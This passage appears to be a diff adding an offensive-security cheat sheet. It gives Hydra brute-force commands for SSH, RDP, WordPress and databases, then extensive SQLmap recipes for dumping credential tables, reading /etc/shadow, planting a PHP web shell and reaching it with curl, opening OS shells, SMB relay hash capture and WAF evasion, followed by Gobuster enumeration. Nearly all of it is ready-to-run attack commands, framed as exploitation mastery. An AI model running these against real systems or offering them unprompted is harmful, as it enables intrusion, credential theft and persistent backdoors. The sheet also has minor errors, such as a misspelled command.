+```bash
+# Test single credential manually
+hydra -l admin -p password123 -V ssh://192.168.1.10
+
+# Check if service is accessible
+nc -zv 192.168.1.10 22
+
+# Verify form parameters work manually
+curl -X POST http://192.168.1.10/login -d "username=admin&password=test"
+```
+
+### List Supported Services
+
+```bash
+# Show all supported modules
+hydra -U
+
+# Show help for specific module
+hydra -U ssh
+hydra -U http-post-form
+```
+
+### Practical Examples
+
+**WordPress brute force:**
+
+```bash
+# Standard wp-login.php
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.10 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=incorrect"
+
+# With verbose output
+hydra -l admin -P passwords.txt -V 192.168.1.10 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=ERROR"
+```
+
+**SSH with username enumeration:**
+
+```bash
+# Step 1: Enumerate users
+hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -p invalid ssh://192.168.1.10 -t 4 -V | grep "password"
+
+# Step 2: Brute force valid users
+hydra -l discovered_user -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10
+```
+
+**RDP brute force (careful with lockout):**
+
+```bash
+# Conservative approach
+hydra -l administrator -P top_100_passwords.txt -t 1 -w 5 rdp://192.168.1.10
+```
+
+**Database brute force:**
+
+```bash
+# MySQL
+hydra -l root -P passwords.txt mysql://192.168.1.10
+
+# PostgreSQL with database name
+hydra -l postgres -P passwords.txt postgres://192.168.1.10/postgres
+
+# MSSQL
+hydra -l sa -P passwords.txt mssql://192.168.1.10
+```
+
+**Multi-service attack:**
+
+```bash
+# Script to try same credentials on multiple services
+for service in ssh ftp telnet; do
+  hydra -l admin -P passwords.txt -f -o ${service}_results.txt ${service}://192.168.1.10
+done
+```
+
+---
+
+## SQLmap
+
+### Overview
+
+SQLmap automates SQL injection detection and exploitation. Supports database fingerprinting, data extraction, file system access, and OS command execution through SQL injection vulnerabilities.
+
+### Basic Syntax
+
+```bash
+sqlmap -u "http://target.com/page?id=1" [options]
+```
+
+### Target Specification
+
+**URL with parameter:**
+
+```bash
+# GET parameter
+sqlmap -u "http://192.168.1.10/page.php?id=1"
+
+# Multiple parameters
+sqlmap -u "http://192.168.1.10/search.php?name=test&category=1"
+
+# Specific parameter to test
+sqlmap -u "http://192.168.1.10/page.php?id=1&sort=name" -p id
+```
+
+**POST requests:**
+
+```bash
+# POST data
+sqlmap -u "http://192.168.1.10/login.php" --data="username=admin&password=pass"
+
+# Test specific POST parameter
+sqlmap -u "http://192.168.1.10/login.php" --data="user=admin&pass=test" -p user
+```
+
+**Request from file:**
+
+```bash
+# Capture request with Burp Suite, save to file
+# request.txt contains full HTTP request
+sqlmap -r request.txt
+
+# Test specific parameter from request
+sqlmap -r request.txt -p id
+```
+
+**Custom HTTP method:**
+
+```bash
+# PUT request
+sqlmap -u "http://192.168.1.10/api/update" --method=PUT --data='{"id":1}'
+
+# DELETE request
+sqlmap -u "http://192.168.1.10/api/delete" --method=DELETE
+```
+
+**Direct database connection:**
+
+```bash
+# Connect directly to database
+sqlmap -d "mysql://user:pass@192.168.1.10:3306/database"
+```
+
+### Request Options
+
+**Custom headers:**
+
+```bash
+# Cookie
+sqlmap -u "http://192.168.1.10/page?id=1" --cookie="PHPSESSID=abc123; security=low"
+
+# User-Agent
+sqlmap -u "http://192.168.1.10/page?id=1" --user-agent="Mozilla/5.0"
+
+# Referer
+sqlmap -u "http://192.168.1.10/page?id=1" --referer="http://192.168.1.10/"
+
+# Custom header
+sqlmap -u "http://192.168.1.10/api/data?id=1" --headers="Authorization: Bearer token123\nX-Custom: value"
+```
+
+**Authentication:**
+
+```bash
+# HTTP Basic Auth
+sqlmap -u "http://192.168.1.10/admin/page?id=1" --auth-type=Basic --auth-cred="admin:password"
+
+# HTTP Digest Auth
+sqlmap -u "http://192.168.1.10/page?id=1" --auth-type=Digest --auth-cred="user:pass"
+
+# NTLM Auth
+sqlmap -u "http://192.168.1.10/page?id=1" --auth-type=NTLM --auth-cred="DOMAIN\user:pass"
+```
+
+**Proxy:**
+
+```bash
+# HTTP proxy
+sqlmap -u "http://192.168.1.10/page?id=1" --proxy="http://127.0.0.1:8080"
+
+# SOCKS proxy
+sqlmap -u "http://192.168.1.10/page?id=1" --proxy="socks5://127.0.0.1:1080"
+
+# Proxy authentication
+sqlmap -u "http://target.com/page?id=1" --proxy="http://127.0.0.1:8080" --proxy-cred="user:pass"
+```
+
+**SSL/TLS:**
+
+```bash
+# Ignore SSL errors
+sqlmap -u "https://192.168.1.10/page?id=1" --force-ssl
+
+# Custom SSL certificate
+sqlmap -u "https://192.168.1.10/page?id=1" --ssl-cert=/path/to/cert.pem
+```
+
+### Detection and Testing
+
+**Risk and level:**
+
+```bash
+# Risk: 1-3 (likelihood of causing harm)
+# Level: 1-5 (number of tests performed)
+
+# Default (safe): --risk=1 --level=1
+sqlmap -u "http://192.168.1.10/page?id=1"
+
+# Moderate testing
+sqlmap -u "http://192.168.1.10/page?id=1" --level=3 --risk=2
+
+# Thorough testing (may cause issues)
+sqlmap -u "http://192.168.1.10/page?id=1" --level=5 --risk=3
+```
+
+**Test specific parameters:**
+
+```bash
+# Test only 'id' parameter
+sqlmap -u "http://192.168.1.10/page?id=1&cat=2" -p id
+
+# Test multiple parameters
+sqlmap -u "http://192.168.1.10/page?id=1&cat=2" -p "id,cat"
+
+# Skip specific parameters
+sqlmap -u "http://192.168.1.10/page?id=1&session=abc" --skip="session"
+```
+
+**Injection techniques:**
+
+```bash
+# Specify techniques to use:
+# B: Boolean-based blind
+# E: Error-based
+# U: Union query-based
+# S: Stacked queries
+# T: Time-based blind
+# Q: Inline queries
+
+# All techniques (default)
+sqlmap -u "http://192.168.1.10/page?id=1"
+
+# Specific technique
+sqlmap -u "http://192.168.1.10/page?id=1" --technique=B
+
+# Multiple techniques
+sqlmap -u "http://192.168.1.10/page?id=1" --technique=BEUST
+
+# Union-based only
+sqlmap -u "http://192.168.1.10/page?id=1" --technique=U
+```
+
+**DBMS specification:**
+
+```bash
+# Auto-detect (default)
+sqlmap -u "http://192.168.1.10/page?id=1"
+
+# Specify DBMS
+sqlmap -u "http://192.168.1.10/page?id=1" --dbms=MySQL
+sqlmap -u "http://192.168.1.10/page?id=1" --dbms=PostgreSQL
+sqlmap -u "http://192.168.1.10/page?id=1" --dbms=MSSQL
+sqlmap -u "http://192.168.1.10/page?id=1" --dbms=Oracle
+sqlmap -u "http://192.168.1.10/page?id=1" --dbms=SQLite
+```
+
+### Enumeration
+
+**Database fingerprinting:**
+
+```bash
+# Banner
+sqlmap -u "http://192.168.1.10/page?id=1" --banner
+
+# Current user
+sqlmap -u "http://192.168.1.10/page?id=1" --current-user
+
+# Current database
+sqlmap -u "http://192.168.1.10/page?id=1" --current-db
+
+# Check if DBA
+sqlmap -u "http://192.168.1.10/page?id=1" --is-dba
+
+# Hostname
+sqlmap -u "http://192.168.1.10/page?id=1" --hostname
+```
+
+**List databases:**
+
+```bash
+sqlmap -u "http://192.168.1.10/page?id=1" --dbs
+```
+
+**List tables:**
+
+```bash
+# All tables in specific database
+sqlmap -u "http://192.168.1.10/page?id=1" -D database_name --tables
+
+# All tables in current database
+sqlmap -u "http://192.168.1.10/page?id=1" --current-db --tables
+```
+
+**List columns:**
+
+```bash
+# Columns in specific table
+sqlmap -u "http://192.168.1.10/page?id=1" -D database_name -T table_name --columns
+
+# Multiple tables
+sqlmap -u "http://192.168.1.10/page?id=1" -D mydb -T users,admins --columns
+```
+
+**Dump data:**
+
+```bash
+# Dump specific table
+sqlmap -u "http://192.168.1.10/page?id=1" -D database_name -T table_name --dump
+
+# Dump specific columns
+sqlmap -u "http://192.168.1.10/page?id=1" -D mydb -T users -C "username,password" --dump
+
+# Dump entire database
+sqlmap -u "http://192.168.1.10/page?id=1" -D database_name --dump-all
+
+# Dump all databases (caution: may take long time)
+sqlmap -u "http://192.168.1.10/page?id=1" --dump-all
+
+# Exclude system databases
+sqlmap -u "http://192.168.1.10/page?id=1" --dump-all --exclude-sysdbs
+```
+
+**Search for data:**
+
+```bash
+# Search for columns
+sqlmap -u "http://192.168.1.10/page?id=1" --search -C password
+
+# Search for tables
+sqlmap -u "http://192.168.1.10/page?id=1" --search -T user
+
+# Search for databases
+sqlmap -u "http://192.168.1.10/page?id=1" --search -D admin
+```
+
+### User and Privilege Enumeration
+
+**Database users:**
+
+```bash
+# List users
+sqlmap -u "http://192.168.1.10/page?id=1" --users
+
+# User passwords
+sqlmap -u "http://192.168.1.10/page?id=1" --passwords
+
+# User privileges
+sqlmap -u "http://192.168.1.10/page?id=1" --privileges
+
+# Specific user privileges
+sqlmap -u "http://192.168.1.10/page?id=1" --privileges -U root
+
+# User roles
+sqlmap -u "http://192.168.1.10/page?id=1" --roles
+```
+
+### File System Access
+
+**Read files:**
+
+```bash
+# Read file from server
+sqlmap -u "http://192.168.1.10/page?id=1" --file-read="/etc/passwd"
+
+# Windows file
+sqlmap -u "http://192.168.1.10/page?id=1" --file-read="C:/Windows/System32/drivers/etc/hosts"
+
+# Application files
+sqlmap -u "http://192.168.1.10/page?id=1" --file-read="/var/www/html/config.php"
+```
+
+**Write files:**
+
+```bash
+# Write file to server (requires FILE privilege)
+sqlmap -u "http://192.168.1.10/page?id=1" --file-write="/root/shell.php" --file-dest="/var/www/html/shell.php"
+
+# Web shell upload
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+sqlmap -u "http://192.168.1.10/page?id=1" --file-write="shell.php" --file-dest="/var/www/html/backdoor.php"
+```
+
+### OS Command Execution
+
+**OS shell:**
+
+```bash
+# Attempt to get OS shell
+sqlmap -u "http://192.168.1.10/page?id=1" --os-shell
+
+# After getting shell, run commands:
+# os-shell> whoami
+# os-shell> cat /etc/passwd
+```
+
+**Execute single command:**
+
+```bash
+sqlmap -u "http://192.168.1.10/page?id=1" --os-cmd="whoami"
+```
+
+**SMB relay (MSSQL specific):**
+
+```bash
+# UNC path injection to capture NetNTLM hash
+sqlmap -u "http://192.168.1.10/page?id=1" --os-smbrelay
+
+# Requires Responder or similar tool listening on attacker machine
+```
+
+### Advanced Techniques
+
+**Second-order SQL injection:**
+
+```bash
+# Payload injected in one place, triggered in another
+sqlmap -u "http://192.168.1.10/profile?id=1" --second-url="http://192.168.1.10/view_profile"
+```
+
+**Tamper scripts:**
+
+```bash
+# Bypass WAF/filters
+sqlmap -u "http://192.168.1.10/page?id=1" --tamper=space2comment
+
+# Multiple tampers
+sqlmap -u "http://192.168.1.10/page?id=1" --tamper=space2comment,between
+
+# Common tamper scripts:
+# space2comment: Replace space with /**/ comment
+# between: Replace > with BETWEEN
+# charencode: URL-encode characters
+# apostrophemask: Replace apostrophe with UTF-8
+# base64encode: Base64 encode payload
+# equaltolike: Replace = with LIKE
+```
+
+**List available tampers:**
+
+```bash
+sqlmap --list-tampers
+```
+
+**Common tamper combinations for WAF bypass:**
+
+```bash
+# Generic WAF bypass
+sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,between,randomcase
+
+# For Microsoft IIS/ASP
+sqlmap -u "http://target.com/page?id=1" --tamper=space2mssqlblank
+
+# For MySQL
+sqlmap -u "http://target.com/page?id=1" --tamper=space2mysqldash
+
+# For quote filtering
+sqlmap -u "http://target.com/page?id=1" --tamper=apostrophemask,apostrophenullencode
+```
+
+**Custom injection points:**
+
+```bash
+# Mark injection point with asterisk (*)
+sqlmap -u "http://192.168.1.10/page" --cookie="id=1*" --level=2
+
+# Multiple injection points
+sqlmap -u "http://192.168.1.10/page?id=1*&cat=2*"
+
+# JSON injection
+sqlmap -u "http://192.168.1.10/api" --data='{"id":"1*","value":"test"}' --level=3
+```
+
+**Blind injection optimization:**
+
+```bash
+# Time-based blind delay
+sqlmap -u "http://192.168.1.10/page?id=1" --time-sec=3
+
+# Binary search optimization
+sqlmap -u "http://192.168.1.10/page?id=1" --technique=B --code=200
+
+# String to match for true condition
+sqlmap -u "http://192.168.1.10/page?id=1" --string="Welcome"
+
+# String indicating false condition
+sqlmap -u "http://192.168.1.10/page?id=1" --not-string="Error"
+```
+
+### Session Management
+
+**Save and resume:**
+
+```bash
+# SQLmap automatically saves sessions
+# Session files in: ~/.local/share/sqlmap/output/target.com/
+
+# Resume specific session
+sqlmap -u "http://192.168.1.10/page?id=1" --flush-session
+sqlmap -u "http://192.168.1.10/page?id=1" --fresh-queries
+
+# Answer 'Y' to use previous session when prompted
+```
+
+**Output directory:**
+
+```bash
+# Custom output directory
+sqlmap -u "http://192.168.1.10/page?id=1" --output-dir=/tmp/sqlmap_results
+```
+
+### Performance Tuning
+
+**Threading:**
+
+```bash
+# Concurrent threads (default 1)
+sqlmap -u "http://192.168.1.10/page?id=1" --threads=5
+
+# Maximum threads (use cautiously)
+sqlmap -u "http://192.168.1.10/page?id=1" --threads=10
+```
+
+**Delays and timeouts:**
+
+```bash
+# Delay between requests (seconds)
+sqlmap -u "http://192.168.1.10/page?id=1" --delay=1
+
+# Timeout for connections (default 30)
+sqlmap -u "http://192.168.1.10/page?id=1" --timeout=60
+
+# Retries on timeout
+sqlmap -u "http://192.168.1.10/page?id=1" --retries=3
+```
+
+**Optimization flags:**
+
+```bash
+# Keep alive connections
+sqlmap -u "http://192.168.1.10/page?id=1" --keep-alive
+
+# Null connection (no response body)
+sqlmap -u "http://192.168.1.10/page?id=1" --null-connection
+
+# Predict output (optimization for UNION)
+sqlmap -u "http://192.168.1.10/page?id=1" --predict-output
+```
+
+### Evasion Techniques
+
+**Randomization:**
+
+```bash
+# Random User-Agent
+sqlmap -u "http://192.168.1.10/page?id=1" --random-agent
+
+# Random parameter values
+sqlmap -u "http://192.168.1.10/page?id=1" --randomize=param_name
+
+# HPP (HTTP Parameter Pollution)
+
+sqlmap -u "http://192.168.1.10/page?id=1" --hpp
+````
+
+**Chunked transfer encoding:**
+```bash
+sqlmap -u "http://192.168.1.10/page?id=1" --chunked
+````
+
+**Crawl and forms:**
+
+```bash
+# Crawl website and test all links
+sqlmap -u "http://192.168.1.10/" --crawl=2
+
+# Automatically parse and test forms
+sqlmap -u "http://192.168.1.10/login.php" --forms
+
+# Crawl and test forms
+sqlmap -u "http://192.168.1.10/" --crawl=2 --forms
+```
+
+**Batch mode (non-interactive):**
+
+```bash
+# Never ask for user input, use defaults
+sqlmap -u "http://192.168.1.10/page?id=1" --batch
+
+# Batch with custom answers
+sqlmap -u "http://192.168.1.10/page?id=1" --batch --answers="crack=N"
+```
+
+### Practical Workflows
+
+**Initial detection and enumeration:**
+
+```bash
+# Step 1: Detect injection
+sqlmap -u "http://192.168.1.10/page?id=1" --batch
+
+# Step 2: Enumerate databases
+sqlmap -u "http://192.168.1.10/page?id=1" --dbs --batch
+
+# Step 3: Enumerate tables in target database
+sqlmap -u "http://192.168.1.10/page?id=1" -D webapp --tables --batch
+
+# Step 4: Enumerate columns in interesting table
+sqlmap -u "http://192.168.1.10/page?id=1" -D webapp -T users --columns --batch
+
+# Step 5: Dump data
+sqlmap -u "http://192.168.1.10/page?id=1" -D webapp -T users -C "username,password" --dump --batch
+```
+
+**Testing from Burp Suite request:**
+
+```bash
+# Step 1: Intercept request in Burp, save to file
+# Right-click > Copy to file > request.txt
+
+# Step 2: Test with SQLmap
+sqlmap -r request.txt --batch
+
+# Step 3: If vulnerable, enumerate
+sqlmap -r request.txt --dbs --batch
+
+# Step 4: Dump specific data
+sqlmap -r request.txt -D targetdb -T users --dump --batch
+```
+
+**WAF bypass workflow:**
+
+```bash
+# Step 1: Test without tampers
+sqlmap -u "http://192.168.1.10/page?id=1" --batch
+
+# If blocked, Step 2: Identify WAF
+sqlmap -u "http://192.168.1.10/page?id=1" --identify-waf
+
+# Step 3: Try tamper scripts
+sqlmap -u "http://192.168.1.10/page?id=1" --tamper=space2comment --batch
+
+# Step 4: Multiple tampers + randomization
+sqlmap -u "http://192.168.1.10/page?id=1" --tamper=space2comment,between,randomcase --random-agent --delay=1 --batch
+
+# Step 5: Adjust risk and level
+sqlmap -u "http://192.168.1.10/page?id=1" --tamper=space2comment --random-agent --level=5 --risk=3 --batch
+```
+
+**POST-based injection:**
+
+```bash
+# Step 1: Test POST parameter
+sqlmap -u "http://192.168.1.10/login.php" --data="username=admin&password=pass" -p username --batch
+
+# Step 2: If vulnerable, enumerate
+sqlmap -u "http://192.168.1.10/login.php" --data="username=admin&password=pass" -p username --dbs --batch
+
+# Step 3: Dump credentials
+sqlmap -u "http://192.168.1.10/login.php" --data="username=admin&password=pass" -p username -D webapp -T users --dump --batch
+```
+
+**Cookie-based injection:**
+
+```bash
+# Step 1: Test cookie parameter
+sqlmap -u "http://192.168.1.10/profile.php" --cookie="id=1*" --level=2 --batch
+
+# Step 2: Enumerate if vulnerable
+sqlmap -u "http://192.168.1.10/profile.php" --cookie="id=1*" --level=2 --dbs --batch
+
+# Step 3: Extract data
+sqlmap -u "http://192.168.1.10/profile.php" --cookie="id=1*" --level=2 -D mydb -T sensitive --dump --batch
+```
+
+**File upload via SQL injection:**
+
+```bash
+# Step 1: Create web shell
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+
+# Step 2: Upload shell
+sqlmap -u "http://192.168.1.10/page?id=1" --file-write="shell.php" --file-dest="/var/www/html/uploads/shell.php" --batch
+
+# Step 3: Access shell
+curl "http://192.168.1.10/uploads/shell.php?cmd=whoami"
+
+# Step 4: Get interactive shell (optional)
+sqlmap -u "http://192.168.1.10/page?id=1" --os-shell --batch
+```
+
+**Blind injection optimization:**
+
+```bash
+# Time-based blind (slower but reliable)
+sqlmap -u "http://192.168.1.10/page?id=1" --technique=T --time-sec=2 --batch
+
+# Boolean-based blind (faster if applicable)
+sqlmap -u "http://192.168.1.10/page?id=1" --technique=B --string="Welcome" --batch
+
+# Combined approach
+sqlmap -u "http://192.168.1.10/page?id=1" --technique=BT --threads=5 --batch
+```
+
+### Database-Specific Features
+
+**MySQL/MariaDB:**
+
+```bash
+# Read file (load_file)
+sqlmap -u "http://192.168.1.10/page?id=1" --file-read="/etc/passwd"
+
+# Write file (into outfile)
+sqlmap -u "http://192.168.1.10/page?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
+
+# Execute OS commands (UDF)
+sqlmap -u "http://192.168.1.10/page?id=1" --os-shell
+```
+
+**MSSQL:**
+
+```bash
+# Execute OS commands (xp_cmdshell)
+sqlmap -u "http://192.168.1.10/page?id=1" --os-cmd="whoami"
+
+# SMB relay attack
+sqlmap -u "http://192.168.1.10/page?id=1" --os-smbrelay
+
+# Registry access
+sqlmap -u "http://192.168.1.10/page?id=1" --reg-read --reg-key="HKLM\Software\Microsoft"
+```
+
+**PostgreSQL:**
+
+```bash
+# Read files
+sqlmap -u "http://192.168.1.10/page?id=1" --file-read="/etc/passwd"
+
+# OS shell (requires admin)
+sqlmap -u "http://192.168.1.10/page?id=1" --os-shell
+
+# Large object support
+sqlmap -u "http://192.168.1.10/page?id=1" --file-read="/etc/shadow"
+```
+
+**Oracle:**
+
+```bash
+# Enumerate tablespaces
+sqlmap -u "http://192.168.1.10/page?id=1" --schema
+
+# Execute OS commands (Java stored procedures)
+sqlmap -u "http://192.168.1.10/page?id=1" --os-shell
+```
+
+**SQLite:**
+
+```bash
+# Enumerate database structure
+sqlmap -u "http://192.168.1.10/page?id=1" --tables
+
+# Dump data
+sqlmap -u "http://192.168.1.10/page?id=1" -D main -T users --dump
+```
+
+### Hash Cracking Integration
+
+**Dump and crack passwords:**
+
+```bash
+# Dump password hashes
+sqlmap -u "http://192.168.1.10/page?id=1" -D mydb -T users -C "username,password" --dump
+
+# SQLmap can attempt to crack hashes automatically
+# When prompted: "Do you want to crack them via a dictionary-based attack? [Y/n/q]"
+# Provide wordlist path or use default
+
+# Manual cracking after dump:
+# Hashes saved in: ~/.local/share/sqlmap/output/target.com/dump/
+john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
+hashcat -m 0 hashes.txt rockyou.txt  # For MD5
+```
+
+**Specify dictionary:**
+
+```bash
+sqlmap -u "http://192.168.1.10/page?id=1" -D webapp -T users --dump --common-columns --passwords
+# When prompted for dictionary: /usr/share/wordlists/rockyou.txt
+```
+
+### API Testing
+
+**JSON API:**
+
+```bash
+# JSON POST request
+sqlmap -u "http://192.168.1.10/api/user" \
+  --method=POST \
+  --data='{"id":"1*","action":"view"}' \
+  --headers="Content-Type: application/json" \
+  --level=3 \
+  --batch
+
+# JSON with nested parameters
+sqlmap -u "http://192.168.1.10/api/search" \
+  --data='{"query":{"user_id":"1*","type":"all"}}' \
+  --headers="Content-Type: application/json" \
+  --batch
+```
+
+**REST API:**
+
+```bash
+# GET with path parameter
+sqlmap -u "http://192.168.1.10/api/users/1*" --batch
+
+# PUT request
+sqlmap -u "http://192.168.1.10/api/users/1" \
+  --method=PUT \
+  --data='{"name":"test*"}' \
+  --headers="Content-Type: application/json" \
+  --batch
+```
+
+**GraphQL:**
+
+```bash
+# GraphQL query injection
+sqlmap -u "http://192.168.1.10/graphql" \
+  --data='{"query":"{ user(id: \"1*\") { name email } }"}' \
+  --headers="Content-Type: application/json" \
+  --batch
+```
+
+### Reporting and Output
+
+**Verbose output:**
+
+```bash
+# Level 1-6 verbosity
+sqlmap -u "http://192.168.1.10/page?id=1" -v 3
+
+# Traffic log
+sqlmap -u "http://192.168.1.10/page?id=1" -t /tmp/traffic.txt
+
+# Parse log file
+sqlmap -l /tmp/burp_log.xml  # Burp Suite log
+```
+
+**CSV output:**
+
+```bash
+# Dump to CSV format
+sqlmap -u "http://192.168.1.10/page?id=1" -D mydb -T users --dump --dump-format=CSV
+```
+
+**Parse results:**
+
+```bash
+# Results stored in:
+ls -la ~/.local/share/sqlmap/output/192.168.1.10/
+
+# View dumped data
+cat ~/.local/share/sqlmap/output/192.168.1.10/dump/database_name/table_name.csv
+```
+
+### Troubleshooting
+
+**Common issues and solutions:**
+
+```bash
+# Connection timeout
+sqlmap -u "http://192.168.1.10/page?id=1" --timeout=60 --retries=5
+
+# WAF detection
+sqlmap -u "http://192.168.1.10/page?id=1" --identify-waf
+# Then apply appropriate tamper scripts
+
+# False negatives (missed injection)
+# Increase level and risk
+sqlmap -u "http://192.168.1.10/page?id=1" --level=5 --risk=3
+
+# No output (blind injection)
+# Verify with specific technique
+sqlmap -u "http://192.168.1.10/page?id=1" --technique=T --time-sec=5 -v 3
+
+# String/regex issues
+# Manually specify true/false conditions
+sqlmap -u "http://192.168.1.10/page?id=1" --string="Welcome" --not-string="Error"
+
+# Cookie/session issues
+# Provide valid session cookie
+sqlmap -u "http://192.168.1.10/page?id=1" --cookie="PHPSESSID=valid_session_here"
+
+# CSRF token
+# Use --csrf-token option with token parameter name
+sqlmap -u "http://192.168.1.10/form" --data="field=value&csrf=token" --csrf-token=csrf
+```
+
+**Debug mode:**
+
+```bash
+# Detailed debug output
+sqlmap -u "http://192.168.1.10/page?id=1" --debug
+
+# Check payloads being used
+sqlmap -u "http://192.168.1.10/page?id=1" -v 4
+```
+
+### Update and Configuration
+
+**Update SQLmap:**
+
+```bash
+# Update from Git repository
+sqlmap --update
+
+# Check version
+sqlmap --version
+```
+
+**Configuration file:**
+
+```bash
+# Default config
+cat /usr/share/sqlmap/sqlmap.conf
+
+# Custom configuration
+cp /usr/share/sqlmap/sqlmap.conf ~/.sqlmap.conf
+# Edit ~/.sqlmap.conf with preferred defaults
+```
+
+### Advanced Examples
+
+**Multi-stage exploitation:**
+
+```bash
+# Stage 1: Detection and fingerprint
+sqlmap -u "http://192.168.1.10/page?id=1" --batch --fingerprint
+
+# Stage 2: Extract database structure
+sqlmap -u "http://192.168.1.10/page?id=1" --schema --batch
+
+# Stage 3: Search for sensitive data
+sqlmap -u "http://192.168.1.10/page?id=1" --search -C password,pass,pwd,hash --batch
+
+# Stage 4: Dump found tables
+sqlmap -u "http://192.168.1.10/page?id=1" -D webapp -T admin_users --dump --batch
+
+# Stage 5: Attempt privilege escalation
+sqlmap -u "http://192.168.1.10/page?id=1" --os-shell --batch
+```
+
+**Complete database compromise:**
+
+```bash
+# Enumerate everything
+sqlmap -u "http://192.168.1.10/page?id=1" \
+  --banner \
+  --current-user \
+  --current-db \
+  --is-dba \
+  --users \
+  --passwords \
+  --privileges \
+  --dbs \
+  --batch
+
+# Dump all non-system databases
+sqlmap -u "http://192.168.1.10/page?id=1" --dump-all --exclude-sysdbs --batch
+
+# Attempt OS access
+sqlmap -u "http://192.168.1.10/page?id=1" --file-read="/etc/passwd" --batch
+sqlmap -u "http://192.168.1.10/page?id=1" --os-shell --batch
+```
+
+---
+
+## Related Critical Topics
+
+For comprehensive exploitation tool mastery, also investigate:
+
+- **Burp Suite Professional** - Intercepting proxy with active scanner, intruder module for advanced fuzzing, and extension ecosystem
+- **Metasploit Framework** - Exploitation framework with auxiliary modules for scanning, post-exploitation pivoting, and payload generation
+- **Custom Script Development** - Python scripting with requests, Scapy for packet crafting, and automation of repetitive exploitation tasks
+- **Password Analytics** - Statistical analysis of cracked passwords to generate targeted wordlists and identify organizational password patterns
+- **Web Application Firewalls (WAF)** - Understanding ModSecurity, AWS WAF, Cloudflare rules to develop effective bypass techniques
+
+---
+
+## Gobuster/Dirbuster
+
+Gobuster is a high-performance directory and DNS brute-forcing tool written in Go. It's faster than Dirbuster and integrates well into automated workflows.
+
+### Gobuster Modes
+
+**Available modes:**
+
+- `dir` - Directory/file enumeration
+- `dns` - DNS subdomain enumeration
+- `vhost` - Virtual host enumeration
+- `s3` - Amazon S3 bucket enumeration
+- `gcs` - Google Cloud Storage enumeration
+- `tftp` - TFTP enumeration
+
+### Directory/File Enumeration (dir mode)
+
+**Basic directory brute-force:**
+
+```bash
+gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
+
+# With extensions
+gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,bak
+
+# Multiple extensions
+gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -x php,asp,aspx,jsp,html,zip,bak
+```
+
+**Common wordlist locations on Kali:**
+
+```bash
+# Small lists (fast)
+/usr/share/wordlists/dirb/common.txt
+/usr/share/wordlists/dirb/big.txt
+
+# Medium lists
+/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+
+# Large lists (comprehensive)
+/usr/share/wordlists/dirbuster/directory-list-2.3-big.txt
+/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt
+
+# Technology-specific
+/usr/share/seclists/Discovery/Web-Content/apache.txt
+/usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt
+/usr/share/seclists/Discovery/Web-Content/nginx.txt
+```
+
+**Advanced options:**
+
+```bash
+# Custom status codes to include
+gobuster dir -u http://target.com -w wordlist.txt -s "200,204,301,302,307,401,403"
+
+# Exclude specific status codes
+gobuster dir -u http://target.com -w wordlist.txt -b "404,400"
+
+# Follow redirects
+gobuster dir -u http://target.com -w wordlist.txt -r
+
+# Show length of response
+gobuster dir -u http://target.com -w wordlist.txt -l
+
+# Custom User-Agent
+gobuster dir -u http://target.com -w wordlist.txt -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+
+# Add custom headers
+gobuster dir -u http://target.com -w wordlist.txt -H "Authorization: Bearer token123"
+
+# Proxy through Burp Suite
+gobuster dir -u http://target.com -w wordlist.txt -p http://127.0.0.1:8080
+
+# Increase threads (default 10)
+gobuster dir -u http://target.com -w wordlist.txt -t 50
+
+# Timeout (default 10s)
+gobuster dir -u http://target.com -w wordlist.txt --timeout 15s
+
+# Wildcard filtering
+gobusteredir -u http://target.com -w wordlist.txt --wildcard
+```
+
+**HTTPS and certificate options:**
+
+```bash
+# Skip SSL certificate verification
+gobuster dir -u https://target.com -w wordlist.txt -k
+
+# Specify client certificate
+gobuster dir -u https://target.com -w wordlist.txt --client-cert cert.pem --client-cert-key key.pem
+```
+
+**Authentication:**
+
+```bash
+# Basic authentication
+gobuster dir -u http://target.com -w wordlist.txt -U username -P password
+
+# Cookie-based authentication
+gobuster dir -u http://target.com -w wordlist.txt -c "PHPSESSID=abc123def456"
+```
+
+**Output options:**
+
+```bash
+# Save output to file
+gobuster dir -u http://target.com -w wordlist.txt -o results.txt
+
+# Quiet mode (only show found)
+gobuster dir -u http://target.com -w wordlist.txt -q
+
+# No status (faster, no live display)
+gobuster dir -u http://target.com -w wordlist.txt --no-status
+
+# Expanded output (show full URLs)
+gobuster dir -u http://target.com -w wordlist.txt -e
+```
+
+**Recursive enumeration:**
+
+```bash
+# Recursively scan discovered directories
+gobuster dir -u http://target.com -w wordlist.txt -r --depth 3
+
+# Note: Gobuster doesn't have native recursive mode like dirb
+# Alternative: use discovered paths as new starting points
+```
+
+**Pattern matching:**
+
+```bash
+# Exclude patterns
+gobuster dir -u http://target.com -w wordlist.txt --exclude-length 1234
+
+# Include specific patterns (custom wordlist required)
+gobuster dir -u http://target.com -w wordlist.txt -p pattern.txt
+```
+
+### DNS Subdomain Enumeration (dns mode)
+
+**Basic subdomain brute-force:**
+
+```bash
+gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+
+# Show CNAMEs
+gobuster dns -d target.com -w dns-wordlist.txt -c
+
+# Show IP addresses
+gobuster dns -d target.com -w dns-wordlist.txt -i
+```
+
+**DNS wordlists on Kali:**
+
+```bash
+/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
+/usr/share/seclists/Discovery/DNS/fierce-hostlist.txt
+/usr/share/seclists/Discovery/DNS/dns-Jhaddix.txt
+```
+
+**Custom DNS resolver:**
+
+```bash
+# Specify DNS server
